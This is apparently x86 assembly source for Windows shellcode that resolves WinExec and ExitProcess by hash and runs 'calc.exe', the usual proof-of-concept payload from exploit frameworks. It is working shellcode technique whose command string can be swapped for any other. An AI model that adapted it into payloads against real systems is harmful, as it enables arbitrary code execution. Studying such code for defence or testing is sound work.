[BITS 32]
[ORG 0]

  cld                    ; clear the direction flag
  call start             ; call start, this pushes the address of 'api_call' onto the stack
delta:
  %include "./x86_api_call.asm"
start:
  pop ebp                ; pop off the address of 'api_call' for calling later

  push byte +1           ; push the command show parameter
  lea eax, [ebp+command-delta] ; calculate an address to the command line
  push eax               ; push the command line parameter
  push dword 0x876F8B31  ; push the hash value for WinExec
  call ebp               ; kernel32.dll!WinExec( &command, SW_NORMAL )

  push byte 0            ; push the desired exit code parameter
  push dword 0x56A2B5F0  ; push the hash value for ExitProcess
  call ebp               ; call kernel32.dll!ExitProcess( 0 )

command:
  db "calc.exe", 0